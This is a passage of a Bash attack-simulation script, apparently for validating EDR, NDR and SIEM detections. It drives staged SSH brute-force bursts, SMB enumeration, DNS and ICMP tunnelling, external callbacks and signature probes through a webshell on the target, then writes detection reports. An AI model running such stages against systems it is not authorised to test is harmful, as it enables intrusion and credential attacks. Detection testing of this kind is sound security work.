        *) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "failed" "${DNS_TUNNEL_SKIP_REASON:-zero queries}" ;;
    esac
    poc_run_dns_tunnel_live_log_validation || true
    save_dns_tunnel_overlap_result
}

stage_service_spike_burst() {
    [[ "${SERVICE_SPIKE}" != true ]] && return 0
    local secs="${SERVICE_SPIKE_SECONDS}" ssh_n http_n https_n smb_n wave=1
    ssh_n=$(safe_int "$(count_remote_target_file "ssh_hosts.txt")")
    http_n=$(safe_int "$(count_remote_target_file "http_targets.txt")")
    https_n=$(safe_int "$(count_remote_target_file "https_targets.txt")")
    smb_n=$(safe_int "$(count_remote_target_file "smb_hosts.txt")")
    log_message "STAGE" "Service spike waves (${secs}s) — baseline→spike→sustain for ML/XDR"
    add_executed_stage "Service Spike Burst"
    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_http 100
        followup_record_ssh 50
        followup_record_dns 100
        return 0
    fi
    for wave in 1 2 3; do
        pipeline_stop_requested && break
        log_message "STAGE" "Service spike wave ${wave}/3 (overlap timeline)"
        state_append "service_spike_waves.log" "cycle=${CURRENT_CYCLE:-1} wave=${wave}"
        if (( http_n > 0 || https_n > 0 )); then
            run_stage_concurrent "Spike-W${wave} HTTP" followup_stage_http
        fi
        if (( ssh_n > 0 )) || [[ "${SSH_AUTH_BURST_ENABLED}" == true ]]; then
            run_stage_concurrent "Spike-W${wave} SSH Auth" stage_ssh_auth_burst
        fi
        if (( smb_n > 0 )); then
            run_stage_concurrent "Spike-W${wave} SMB" followup_stage_smb
        fi
        run_stage_concurrent "Spike-W${wave} DNS" followup_stage_dns
        wait_all_humanize_workers
        interruptible_sleep 2 || break
    done
    write_report_entries "service_spike" "TA0011" "XDR/NDR" "ML Spike" "multi" "success" "3-wave concurrent spike ${secs}s"
}

stage_mandatory_service_followups() {
    local ssh_n http_n https_n smb_n dns_cap usable_http usable_ssh http_done=false
    ssh_n=$(safe_int "$(count_remote_target_file "ssh_hosts.txt")")
    http_n=$(safe_int "$(count_remote_target_file "http_targets.txt")")
    https_n=$(safe_int "$(count_remote_target_file "https_targets.txt")")
    smb_n=$(safe_int "$(count_remote_target_file "smb_hosts.txt")")
    usable_http=$(safe_int "$(count_remote_target_file "usable_http_targets.txt")")
    usable_ssh=$(safe_int "$(count_remote_target_file "usable_ssh_hosts.txt")")
    count_all_discovered_services >/dev/null

    log_message "STAGE" "Mandatory service follow-ups (intensity=${FOLLOWUP_INTENSITY}, discovered=${SERVICES_DISCOVERED_TOTAL}, usable=${SERVICES_USABLE_TOTAL})"
    add_executed_stage "Mandatory Service Follow-ups"
    state_append "services_discovered.log" "ssh=${ssh_n} http=${http_n} https=${https_n} smb=${smb_n} usable=${SERVICES_USABLE_TOTAL} total=${SERVICES_DISCOVERED_TOTAL}"

    if (( http_n > 0 || https_n > 0 || usable_http > 0 )); then
        log_adaptive_decision "HTTP/HTTPS detected — HTTP URL Scan before EDR static signature test"
        followup_stage_http
        stage_ids_waf_signature_probe
        http_done=true
    fi

    if [[ "${EDR_STATIC_TEST_ENABLED}" == true ]]; then
        stage_edr_static_detection_test || true
    fi

    if [[ "${WEBSHELL_CHANNEL_BROKEN}" == true ]]; then
        log_message "WARN" "Webshell command execution failed during EDR static test — skipping remaining webshell-based follow-up stages"
        add_skipped_stage "Mandatory Service Follow-ups (webshell)" "WEBSHELL_CHANNEL_BROKEN after EDR static test"
        state_append "edr_static_test.log" "WEBSHELL_FOLLOWUP_SKIP reason=webshell_exec_failed_after_edr_test"
        return 0
    fi

    if [[ "${PIPELINE_OVERLAP}" == true ]]; then
        log_adaptive_decision "Multi-domain overlap: SSH+DNS+ICMP+callback+non-standard ports concurrent (HTTP already completed)"
        CORRELATION_OVERLAP_LAUNCHED=true
        run_stage_concurrent "Enhanced DNS Tunnel" stage_dns_tunnel_enhanced
        run_stage_concurrent "ICMP Tunnel Simulation" stage_icmp_tunnel_simulation
        run_stage_concurrent "Non-Standard Port Follow-up" stage_nonstandard_port_followup
        run_stage_concurrent "External Callback" stage_external_callback
        if [[ "${http_done}" != true ]] && (( http_n > 0 || https_n > 0 || usable_http > 0 )); then
            run_stage_concurrent "Mandatory HTTP URL Burst" followup_stage_http
            run_stage_concurrent "IDS/WAF Signature Probe" stage_ids_waf_signature_probe
        fi
        if (( ssh_n > 0 || usable_ssh > 0 )); then
            SSH_AUTH_BURST_ENABLED=true
            run_stage_concurrent "Mandatory SSH Auth Burst" stage_ssh_auth_burst
        fi
        if (( smb_n > 0 )); then
            run_stage_concurrent "Mandatory SMB" followup_stage_smb
        fi
        if [[ "${DNS_NEW_TLD_ENABLED}" == true ]]; then
            run_stage_concurrent "DNS New TLD Test" followup_stage_dns_new_tld
        fi
        run_stage_concurrent "Mandatory DNS" followup_stage_dns
        if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
            run_stage_concurrent "DGA Simulation" followup_stage_dga
        fi
        wait_all_humanize_workers
        maybe_run_internal_web_fanout_fallback
        CORRELATION_CALLBACK_DONE=true
        return 0
    fi

    if [[ "${http_done}" != true ]] && (( http_n > 0 || https_n > 0 || usable_http > 0 )); then
        log_adaptive_decision "HTTP/HTTPS detected — forcing aggressive web follow-up"
        followup_stage_http
        stage_ids_waf_signature_probe
    fi
    if (( ssh_n > 0 || usable_ssh > 0 )); then
        log_adaptive_decision "SSH — forcing SSH Auth Burst (EDR/SIEM auth.log telemetry)"
        SSH_AUTH_BURST_ENABLED=true
        stage_ssh_auth_burst
    fi
    if (( smb_n > 0 )); then
        log_adaptive_decision "SMB detected — forcing SMB enumeration burst"
        followup_stage_smb
    fi
    dns_cap=1
    if [[ "${HAS_dig:-false}" == true || "${HAS_nslookup:-false}" == true || "${HAS_python3:-false}" == true ]]; then
        dns_cap=1
    fi
    if [[ "${DNS_NEW_TLD_ENABLED}" == true ]] && (( dns_cap > 0 )); then
        log_adaptive_decision "DNS New TLD Test — diverse new-TLD query burst (dns_new_tld analytics validation)"
        followup_stage_dns_new_tld
    fi
    if (( dns_cap > 0 )); then
        log_adaptive_decision "DNS capability — forcing entropy DNS burst"
        followup_stage_dns
    fi
    if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
        log_adaptive_decision "DGA Simulation — NXDOMAIN burst + same-eTLD resolvable follow-up (independent of DNS tunnel)"
        followup_stage_dga
    fi
}

stage_followup_validation() {
    local ssh_n http_n https_n smb_n had_services=false failed=false
    local strict=false http_reachable_total=0 dns_cap=0 icmp_cap=0

    load_overlap_stage_results_from_state
    sync_followup_http_counter_from_overlap
    sync_followup_ssh_counter_from_overlap

    ssh_n=$(safe_int "$(count_remote_target_file "ssh_hosts.txt")")
    http_n=$(safe_int "$(count_remote_target_file "http_targets.txt")")
    https_n=$(safe_int "$(count_remote_target_file "https_targets.txt")")
    smb_n=$(safe_int "$(count_remote_target_file "smb_hosts.txt")")

    if [[ "${STRICT_FOLLOWUP_VALIDATION}" == true || "${POC_INTENSITY}" == high || "${POC_INTENSITY}" == spike ]]; then
        strict=true
    fi

    if (( ssh_n + http_n + https_n + smb_n > 0 )); then
        had_services=true
    fi

    add_executed_stage "Follow-up Validation"
    state_append "followup_validation.log" "strict=${strict} services=${had_services} http=${FOLLOWUP_HTTP_REQUESTS} attempted=${HTTP_REQUESTS_ATTEMPTED} ssh=${FOLLOWUP_SSH_AUTH_FAILURES} smb=${FOLLOWUP_SMB_PROBES} dns=${FOLLOWUP_DNS_QUERIES} total=${FOLLOWUP_ACTIONS_TOTAL}"

    sync_web_combined_metrics
    compute_web_detection_confidence

    http_reachable_total=$((HTTP_TARGETS_REACHABLE + HTTPS_TARGETS_REACHABLE))

    if (( HTTP_SCAN_TARGET_COUNT == 0 )); then
        log_message "WARN" "URL Scan skipped — no reachable HTTP/HTTPS targets (not a failure)"
    elif (( HTTP_SCAN_TARGET_COUNT > 0 && HTTP_REQUESTS_ATTEMPTED == 0 )); then
        log_message "ERROR" "URL-SCAN EXECUTION FAILURE — selected_targets=${HTTP_SCAN_TARGET_COUNT} attempted=0"
        failed=true
        FOLLOWUP_VALIDATION_FAILED=true
    elif (( HTTP_SCAN_TARGET_COUNT > 0 && WEB_RESPONSES_RECEIVED == 0 )); then
        log_message "ERROR" "URL-SCAN RESPONSE FAILURE — no web responses received"
        if [[ "${strict}" == true ]]; then
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
        else
            log_message "WARN" "URL Scan produced no responses (non-fatal for ${POC_INTENSITY} intensity)"
        fi
    elif (( HTTP_SCAN_TARGET_COUNT > 0 )) && ! web_url_scan_successful; then
        if [[ "${strict}" == true ]]; then
            log_message "ERROR" "FOLLOW-UP VALIDATION FAILURE — URL Scan quality below threshold"
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
        else
            log_message "WARN" "URL Scan quality below threshold (non-fatal for ${POC_INTENSITY} intensity)"
        fi
    fi

    local http_followup_count="${FOLLOWUP_HTTP_REQUESTS}"
    (( http_followup_count < HTTP_REQUESTS_ATTEMPTED )) && http_followup_count="${HTTP_REQUESTS_ATTEMPTED}"
    if (( http_n + https_n > 0 )) && (( http_followup_count < MIN_HTTP_FOLLOWUP )); then
        log_message "WARN" "HTTP below minimum (${http_followup_count} < ${MIN_HTTP_FOLLOWUP}) — emergency HTTP burst"
        if [[ "${DRY_RUN}" != true ]]; then
            HTTP_FOLLOWUP_REQUESTS="${MIN_HTTP_FOLLOWUP}"
            followup_stage_http
        fi
        [[ "${strict}" == true && HTTP_SCAN_TARGET_COUNT > 0 ]] && failed=true
    fi
    local ssh_followup_count="${FOLLOWUP_SSH_AUTH_FAILURES}"
    (( ssh_followup_count < SSH_ATTEMPTS_EXECUTED )) && ssh_followup_count="${SSH_ATTEMPTS_EXECUTED}"
    (( ssh_followup_count < SSH_AUTH_FAILURES_OBSERVED )) && ssh_followup_count="${SSH_AUTH_FAILURES_OBSERVED}"
    if (( ssh_n > 0 )) && (( ssh_followup_count < MIN_SSH_AUTH_FAILURES )); then
        log_message "WARN" "SSH auth below minimum (${ssh_followup_count} < ${MIN_SSH_AUTH_FAILURES}) — emergency SSH auth burst"
        if [[ "${DRY_RUN}" != true ]]; then
            SSH_AUTH_BURST_ENABLED=true
            SSH_BURST_ATTEMPTS="${MIN_SSH_AUTH_FAILURES}"
            stage_ssh_auth_burst
        fi
        [[ "${strict}" == true ]] && failed=true
    fi
    if (( smb_n > 0 )) && (( FOLLOWUP_SMB_PROBES < MIN_SMB_PROBES )); then
        log_message "WARN" "SMB below minimum — emergency SMB burst"
        if [[ "${DRY_RUN}" != true ]]; then
            SMB_PROBE_TARGET="${MIN_SMB_PROBES}"
            followup_stage_smb
        fi
        [[ "${strict}" == true ]] && failed=true
    fi
    if (( FOLLOWUP_DNS_QUERIES < MIN_DNS_QUERIES )); then
        if [[ "${DRY_RUN}" != true ]]; then
            DNS_BURST_COUNT="${MIN_DNS_QUERIES}"
            followup_stage_dns
        fi
    fi

    if [[ "${HAS_dig:-false}" == true || "${HAS_nslookup:-false}" == true || "${HAS_python3:-false}" == true ]]; then
        dns_cap=1
    fi
    if [[ "${HAS_ping:-false}" == true ]]; then
        icmp_cap=1
    fi

    if (( DNS_QUERIES_ATTEMPTED == 0 )); then
        if (( dns_cap == 0 )); then
            DEGRADED_TELEMETRY=true
            log_message "WARN" "DNS tunnel: degraded telemetry — DNS capability missing on webshell host"
        else
            log_message "WARN" "DNS tunnel enhanced: no queries attempted (DNS_QUERIES_ATTEMPTED=0)"
        fi
    fi
    if (( ICMP_TOTAL_PACKETS == 0 && ICMP_PACKETS_ATTEMPTED == 0 )); then
        if (( icmp_cap == 0 )); then
            DEGRADED_TELEMETRY=true
            log_message "WARN" "ICMP tunnel: degraded telemetry — ping unavailable on webshell host"
        elif [[ "${ICMP_TUNNEL_STAGE_STATUS}" == degraded ]]; then
            DEGRADED_TELEMETRY=true
            log_message "WARN" "ICMP tunnel: degraded telemetry (status=degraded fallback=${ICMP_FALLBACK_MODE})"
        elif (( ICMP_TARGET_COUNT > 0 )); then
            log_message "ERROR" "ICMP tunnel: no packets attempted with targets=${ICMP_TARGET_COUNT} (ICMP_TOTAL_PACKETS=0)"
            [[ "${strict}" == true ]] && failed=true
        else
            log_message "WARN" "ICMP tunnel: no packets attempted (ICMP_TOTAL_PACKETS=0)"
        fi
    elif [[ "${ICMP_TUNNEL_STAGE_STATUS}" == degraded ]] && (( ICMP_PACKETS_ATTEMPTED > 0 )); then
        DEGRADED_TELEMETRY=true
        log_message "WARN" "ICMP tunnel: degraded success — attempted=${ICMP_PACKETS_ATTEMPTED} total=${ICMP_TOTAL_PACKETS} fallback=${ICMP_FALLBACK_MODE}"
    fi
    if (( INTERNAL_FANOUT_TARGETS == 0 )); then
        log_message "WARN" "Internal Web Fanout skipped — no fanout targets"
    elif (( EXTERNAL_CALLBACK_CONNECTED == 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
        log_message "ERROR" "INTERNAL FANOUT EXECUTION FAILURE — callback connected=0 with fanout targets present"
        failed=true
        FOLLOWUP_VALIDATION_FAILED=true
    fi

    if [[ "${strict}" == true ]]; then
        if (( dns_cap > 0 && DNS_QUERIES_PLANNED > 0 && DNS_QUERIES_ATTEMPTED == 0 )); then
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
            log_message "ERROR" "FOLLOW-UP VALIDATION FAILURE — DNS planned but attempted=0"
        fi
        if (( icmp_cap > 0 && ICMP_PACKETS_PLANNED > 0 && ICMP_PACKETS_ATTEMPTED == 0 )); then
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
            log_message "ERROR" "FOLLOW-UP VALIDATION FAILURE — ICMP planned but attempted=0"
        fi
    fi

    if (( FOLLOWUP_ACTIONS_TOTAL == 0 )) && [[ "${had_services}" == true ]] && (( http_reachable_total > 0 || ssh_n > 0 || smb_n > 0 )); then
        failed=true
        SCAN_ONLY_WARNING=true
        log_message "ERROR" "SCAN-ONLY FAILURE: services discovered with reachable targets but follow-up actions=0"
        state_append "scan_only_failure.log" "cycle=${CURRENT_CYCLE:-1} SCAN-ONLY FAILURE"
    fi

    if [[ "${failed}" == true && "${strict}" == true ]]; then
        FOLLOWUP_VALIDATION_FAILED=true
        SCAN_ONLY_WARNING=true
    fi

    compute_followup_validation_result
    case "${VALIDATION_RESULT}" in
        FAIL)
            FOLLOWUP_VALIDATION_FAILED=true
            set_stage_result "Follow-up Validation" "Failed" "${VALIDATION_REASON}"
            return 1
            ;;
        WARN)
            set_stage_result "Follow-up Validation" "Partial" "${VALIDATION_REASON}"
            return 0
            ;;
        *)
            if [[ "${failed}" == true ]]; then
                FOLLOWUP_VALIDATION_FAILED=true
                set_stage_result "Follow-up Validation" "Partial" "follow-up checks incomplete (${VALIDATION_REASON})"
                return 0
            fi
            set_stage_result "Follow-up Validation" "Success" "${VALIDATION_REASON}"
            return 0
            ;;
    esac
}

simulate_dry_run_followup_counts() {
    [[ "${DRY_RUN}" != true ]] && return 0
    [[ -n "${FOLLOWUP_DRY_RUN_SIMULATED:-}" ]] && return 0
    FOLLOWUP_DRY_RUN_SIMULATED=1
    local ssh_n smb_n candidates
    stage_validate_web_reachability || true
    candidates=$(collect_http_url_scan_candidates)
    if select_http_url_scan_concentrated_target "${candidates}" >/dev/null; then
        read -r _main_h _main_p _main_s <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
        sync_url_scan_selected_target_count "${_main_h} ${_main_p} ${_main_s}"
    else
        sync_url_scan_selected_target_count ""
    fi
    ssh_n=$(count_hosts_blob "$(get_local_hosts "ssh_hosts.txt")")
    smb_n=$(count_hosts_blob "$(get_local_hosts "smb_hosts.txt")")
    SERVICES_DISCOVERED_TOTAL=$((HTTP_TARGETS_DISCOVERED + HTTPS_TARGETS_DISCOVERED + ssh_n + smb_n + 4))
    if (( HTTP_SCAN_TARGET_COUNT > 0 )); then
        resolve_http_followup_mode
        resolve_http_scan_wave_plan
        [[ "${HTTP_FOLLOWUP_MODE}" == "tcp-fallback" && "${DRY_RUN}" == true ]] && HTTP_FOLLOWUP_MODE="planned (remote deps not checked)"
        HTTP_REQUESTS_PLANNED="${HTTP_SCAN_UNIQUE_URL_TARGET}"
        print_http_ua_dry_run_samples
        simulate_http_scan_response_metrics "${HTTP_REQUESTS_PLANNED}"
        simulate_http_attack_metrics "${HTTP_REQUESTS_PLANNED}"
        HTTP_REQUESTS_ATTEMPTED="${HTTP_REQUESTS_PLANNED}"
        URL_SCAN_UNIQUE_ATTEMPTED="${HTTP_SCAN_UNIQUE_URL_TARGET}"
        simulate_url_scan_unique_metrics "${URL_SCAN_UNIQUE_ATTEMPTED}"
        HTTP_RESPONSES_RECEIVED=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES))
        HTTP_CONNECTED="${HTTP_RESPONSES_RECEIVED}"
        HTTP_PROPFIND_COUNT=$((HTTP_REQUESTS_PLANNED / 8 + 1))
        HTTP_POST_COUNT=$((HTTP_REQUESTS_PLANNED / 6 + 1))
        HTTP_OPTIONS_COUNT=$((HTTP_REQUESTS_PLANNED / 10 + 1))
        ABNORMAL_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED * 9 / 10))
        RARE_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED * 4 / 10))
        NORMAL_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED / 10))
        PAYLOAD_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED * 5 / 10))
        UA_SQLI_STYLE_COUNT=$((HTTP_REQUESTS_PLANNED * 2 / 10))
        UA_ENCODING_ABUSE_COUNT=$((HTTP_REQUESTS_PLANNED * 2 / 10))
        UA_COMMAND_STYLE_COUNT=$((HTTP_REQUESTS_PLANNED / 10))
        THREAT_HUNT_URL_REQUESTS="${HTTP_REQUESTS_PLANNED}"
        HTTP_URL_SCAN_STAGE_STATUS="success"
        sync_http_followup_counter_aliases
        sync_web_combined_metrics
        compute_web_detection_confidence
        followup_record_http "${HTTP_REQUESTS_PLANNED}"
    else
        HTTP_REQUESTS_PLANNED=0
        HTTP_REQUESTS_ATTEMPTED=0
        HTTP_URL_SCAN_STAGE_STATUS="skipped"
    fi
    if (( ssh_n > 0 )) || [[ "${SSH_AUTH_BURST_ENABLED}" == true ]]; then
        (( ssh_n < 1 )) && ssh_n=1
        SSH_ATTEMPTS_PLANNED=$((ssh_n * SSH_BURST_ATTEMPTS))
        SSH_ATTEMPTS_EXECUTED="${SSH_ATTEMPTS_PLANNED}"
        SSH_AUTH_ATTEMPTED="${SSH_ATTEMPTS_PLANNED}"
        SSH_AUTH_FAILURES_OBSERVED="${SSH_ATTEMPTS_PLANNED}"
        followup_record_ssh "${SSH_ATTEMPTS_PLANNED}"
    fi
    if (( smb_n > 0 )); then
        SMB_PROBES_PLANNED=$(( smb_n * SMB_PROBE_TARGET ))
        SMB_PROBES_ATTEMPTED="${SMB_PROBES_PLANNED}"
        SMB_PROBES_CONNECTED="${SMB_PROBES_PLANNED}"
        followup_record_smb "${SMB_PROBES_PLANNED}"
    fi
    DNS_QUERIES_ATTEMPTED="${DNS_BURST_COUNT}"
    followup_record_dns "${DNS_BURST_COUNT}"
    SERVICES_USABLE_TOTAL="${SERVICES_DISCOVERED_TOTAL}"
    simulate_correlation_telemetry_dry_run
}

print_followup_dry_run_plan() {
    simulate_dry_run_followup_counts
    cat <<EOF
[SERVICE-AWARE FOLLOW-UP PLAN]
$(format_intensity_runtime_values_block)
- User intensity: ${POC_INTENSITY} (schedule: $(pipeline_schedule_description))
- HTTP per host: ${HTTP_FOLLOWUP_REQUESTS} | SSH auth per host: ${SSH_BURST_ATTEMPTS} | DNS: ${DNS_BURST_COUNT} | SMB/host: ${SMB_PROBE_TARGET}
- Persistent beacon: ${PERSISTENT_BEACON} | Overlap: ${PIPELINE_OVERLAP} | Burst: ${BURST_MODE} | Service spike: ${SERVICE_SPIKE}
- Simulated totals: HTTP=${FOLLOWUP_HTTP_REQUESTS} SSH=${FOLLOWUP_SSH_AUTH_FAILURES} SMB=${FOLLOWUP_SMB_PROBES} DNS=${FOLLOWUP_DNS_QUERIES}

Web Reachability (planned)
- HTTP discovered=${HTTP_TARGETS_DISCOVERED} HTTP reachable=${HTTP_TARGETS_REACHABLE}
- HTTPS discovered=${HTTPS_TARGETS_DISCOVERED} HTTPS reachable=${HTTPS_TARGETS_REACHABLE}
- URL scan selected targets=${HTTP_SCAN_TARGET_COUNT}

HTTP URL Scan (planned)
- planned=${HTTP_REQUESTS_PLANNED} attempted=${HTTP_REQUESTS_ATTEMPTED} connected=${HTTP_CONNECTED} responses=${WEB_RESPONSES_RECEIVED}
- 403/404/405=${HTTP_403_COUNT}/${HTTP_404_COUNT}/${HTTP_405_COUNT} fail_ratio=${HTTP_SCAN_FAIL_RATIO}% stage_status=${HTTP_URL_SCAN_STAGE_STATUS}
$(format_url_scan_stellar_model_block)
- Success metrics: HTTP planned/attempted/connected=${HTTP_REQUESTS_PLANNED}/${HTTP_REQUESTS_ATTEMPTED}/${HTTP_CONNECTED} SSH planned/attempted/observed=${SSH_ATTEMPTS_PLANNED}/${SSH_AUTH_ATTEMPTED}/${SSH_AUTH_FAILURES_OBSERVED}
- Strict validation (high/spike): ${STRICT_FOLLOWUP_VALIDATION}

[CORRELATION TELEMETRY PLAN]
- External Callback: ${ATTACKER_BASE_URL} planned=${BEACON_COUNT} status=${EXTERNAL_CALLBACK_STATUS:-planned}
- Internal Web Fanout per target: ${INTERNAL_FANOUT_PER_TARGET} targets=${INTERNAL_FANOUT_TARGETS:-0} status=${INTERNAL_FANOUT_STATUS:-planned}
- DNS Tunnel Enhanced planned: ${DNS_TUNNEL_QUERY_COUNT} status=${DNS_TUNNEL_STAGE_STATUS:-planned}
- ICMP Tunnel planned: ${ICMP_PACKET_COUNT} status=${ICMP_TUNNEL_STAGE_STATUS:-planned}
- External attempted/connected/responses: ${EXTERNAL_CALLBACK_ATTEMPTED}/${EXTERNAL_CALLBACK_CONNECTED}/${EXTERNAL_CALLBACK_RESPONSES}
- Internal fanout attempted/connected/responses: ${INTERNAL_FANOUT_ATTEMPTED}/${INTERNAL_FANOUT_CONNECTED}/${INTERNAL_FANOUT_RESPONSES}
- DNS enhanced attempted/planned: ${DNS_QUERIES_ATTEMPTED}/${DNS_QUERIES_PLANNED}
- DNS effective-TLD/cluster.local/powerapps/suspicious/https/entropy: ${DNS_EFFECTIVE_TLD_COUNT:-0}/${DNS_CLUSTER_LOCAL_COUNT:-0}/${DNS_POWERAPPS_STYLE_COUNT:-0}/${DNS_SUSPICIOUS_TLD_COUNT:-0}/${DNS_HTTPS_QUERY_COUNT:-0}/${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}
- ICMP total/echo/ttl-exceeded/dest-unreachable/targets: ${ICMP_TOTAL_PACKETS:-0}/${ICMP_ECHO_COUNT:-0}/${ICMP_TIME_EXCEEDED_STYLE_COUNT:-0}/${ICMP_DEST_UNREACHABLE_STYLE_COUNT:-0}/${ICMP_TARGETS:-0}
- Non-standard port connections: ${NONSTANDARD_PORT_CONNECTIONS:-0}
- Internal fanout planned (targets*${INTERNAL_FANOUT_PER_TARGET}): see fanout targets
- Correlation beacon cycles: ${CORRELATION_BEACON_CYCLES:-0}

$(format_unified_telemetry_capability_summary)
EOF
}

append_followup_report_sections() {
    local scan_warn="no"
    [[ "${SCAN_ONLY_WARNING}" == true ]] && scan_warn="YES — investigate follow-up execution"
    if [[ -n "${REPORT_MD}" ]]; then
        cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## Correlation Telemetry Summary

$(format_correlation_telemetry_summary_block)

## HTTP Follow-up Summary

| Metric | Value |
|---|---|
| HTTP Planned | ${HTTP_REQUESTS_PLANNED} |
| HTTP Attempted | ${HTTP_REQUESTS_ATTEMPTED} |
| HTTP Connected | ${HTTP_CONNECTED} |
| HTTP Responses Received | ${HTTP_RESPONSES_RECEIVED} |
| HTTP 403 Count | ${HTTP_403_COUNT} |
| HTTP 404 Count | ${HTTP_404_COUNT} |
| HTTP 405 Count | ${HTTP_405_COUNT} |
| HTTP Failed Responses | ${HTTP_SCAN_FAILED_RESPONSES} |
| HTTP Successful Responses | ${HTTP_SCAN_SUCCESS_RESPONSES} |
| HTTP Fail Ratio | ${HTTP_SCAN_FAIL_RATIO}% |
| PROPFIND Count | ${HTTP_PROPFIND_COUNT} |
| POST Count | ${HTTP_POST_COUNT} |
| OPTIONS Count | ${HTTP_OPTIONS_COUNT} |
| Scan Targets (responsive) | ${HTTP_SCAN_TARGET_COUNT} |
| Unique URLs Attempted | ${URL_SCAN_UNIQUE_ATTEMPTED} |
| Unique Failed URLs | ${URL_SCAN_UNIQUE_FAILED} |
| Unique Successful URLs | ${URL_SCAN_UNIQUE_SUCCESS} |
| Unique Failure Ratio | ${URL_SCAN_UNIQUE_FAIL_RATIO}% |
| Estimated Anomaly Score | ${URL_SCAN_ANOMALY_SCORE} |
| Expected Detection | External URL Reconnaissance Anomaly |
| Expected Event | external_url_scan |
| Expected Technique | T1595 Active Scanning |
| Threat Hunt URL Requests | ${THREAT_HUNT_URL_REQUESTS} |
| Abnormal User-Agent Count | ${ABNORMAL_USER_AGENT_COUNT} |
| Rare User-Agent Count | ${RARE_USER_AGENT_COUNT} |
| Normal User-Agent Count | ${NORMAL_USER_AGENT_COUNT} |
| Payload User-Agent Count | ${PAYLOAD_USER_AGENT_COUNT} |
| SQLi-style UA Count | ${UA_SQLI_STYLE_COUNT} |
| Encoding-abuse UA Count | ${UA_ENCODING_ABUSE_COUNT} |
| Command-style UA Count | ${UA_COMMAND_STYLE_COUNT} |
| HTTP Follow-up Mode | ${HTTP_FOLLOWUP_MODE} |
| Expected HTTP Detection Impact | ${EXPECTED_HTTP_DETECTION_IMPACT} |

## IDS/WAF/EDR Signature Probe

| Metric | Value |
|---|---|
| Status | ${IDS_WAF_SIG_PROBE_STATUS} |
| Active web targets | ${IDS_WAF_SIG_TARGET_COUNT} |
| Signatures attempted | ${IDS_WAF_SIG_ATTEMPTED} |
| HTTP responses | ${IDS_WAF_SIG_RESPONSES} |
| Traversal signatures | ${IDS_WAF_SIG_TRAVERSAL} |
| Tomcat PUT signature | ${IDS_WAF_SIG_TOMCAT_PUT} |
| Spring header signature | ${IDS_WAF_SIG_SPRING_HDR} |
| EDR cmd.jsp signatures | ${IDS_WAF_SIG_EDR_CMD} |

## EDR Static Signature Detection Test

| Metric | Value |
|---|---|
| Stage status | ${EDR_STATIC_STAGE_STATUS} |
| Files attempted | ${EDR_TEST_FILES_ATTEMPTED} |
| Files created | ${EDR_TEST_FILES_SUCCESS} |
| Quarantine suspected | ${EDR_TEST_QUARANTINE_SUSPECTED} |
| Create failed | ${EDR_TEST_FILES_FAILED} |
| Remote OS | ${EDR_TEST_REMOTE_OS} |
| Test directory | ${EDR_TEST_DIR:-n/a} |
| Webshell URL | ${WEB_SHELL_URL:-n/a} |
| Extended files | ${EDR_EXTENDED_FILES} |
| Cleanup on PoC exit | ${EDR_TEST_CLEANUP} |

## Service Follow-up Telemetry

| Metric | Value |
|---|---|
| User Intensity | ${POC_INTENSITY} |
| Duration (minutes) | ${DURATION_MINUTES} |
| Persistent Beacon Enabled | ${PERSISTENT_BEACON} |
| Overlap Enabled | ${PIPELINE_OVERLAP} |
| Services Discovered (host entries) | ${SERVICES_DISCOVERED_TOTAL} |
| Follow-up Actions Total | ${FOLLOWUP_ACTIONS_TOTAL} |
| HTTP Planned / Attempted / Connected | ${HTTP_REQUESTS_PLANNED} / ${HTTP_REQUESTS_ATTEMPTED} / ${HTTP_CONNECTED} |
| HTTP Responses / Threat Hunt / Abnormal / Rare UA | ${HTTP_RESPONSES_RECEIVED} / ${THREAT_HUNT_URL_REQUESTS} / ${ABNORMAL_USER_AGENT_COUNT} / ${RARE_USER_AGENT_COUNT} |
| HTTP Requests (counter) | ${FOLLOWUP_HTTP_REQUESTS} |
| SSH Planned / Attempted / Observed | ${SSH_ATTEMPTS_PLANNED} / ${SSH_AUTH_ATTEMPTED} / ${SSH_AUTH_FAILURES_OBSERVED} |
| SSH Attempts Executed | ${SSH_ATTEMPTS_EXECUTED} |
| SSH Auth Failures (counter) | ${FOLLOWUP_SSH_AUTH_FAILURES} |
| SMB Planned / Attempted / Connected | ${SMB_PROBES_PLANNED} / ${SMB_PROBES_ATTEMPTED} / ${SMB_PROBES_CONNECTED} |
| SMB Probe Count | ${FOLLOWUP_SMB_PROBES} |
| DNS Planned / Attempted | ${DNS_BURST_COUNT} / ${DNS_QUERIES_ATTEMPTED} |
| DNS Query Count | ${FOLLOWUP_DNS_QUERIES} |
| Services Usable (validated) | ${SERVICES_USABLE_TOTAL} |
| Degraded Telemetry | ${DEGRADED_TELEMETRY} |
| Service Spike | ${SERVICE_SPIKE} (${SERVICE_SPIKE_SECONDS}s) |
| Scan-only / Validation | ${scan_warn} |
| Follow-up Validation Failed | ${FOLLOWUP_VALIDATION_FAILED} |

### ML / XDR Spike Indicators
- High-volume HTTP URI probing (${FOLLOWUP_HTTP_REQUESTS} requests)
- Repeated SSH auth failures (${FOLLOWUP_SSH_AUTH_FAILURES})
- SMB enumeration bursts (${FOLLOWUP_SMB_PROBES})
- DNS entropy queries (${FOLLOWUP_DNS_QUERIES})
- Overlap + persistent beacon: ${PIPELINE_OVERLAP} / ${PERSISTENT_BEACON}

### Detection Opportunity Summary
- WAF/IDS: suspicious URI storm, odd User-Agents, 404 patterns
- SIEM: failed SSH authentication chains
- NDR: SMB/RPC lateral recon, DNS tunneling entropy
- UEBA: burst timing + concurrent overlap stages
- XDR ML: volume spike vs baseline during campaign window

### Detection Threshold Notes
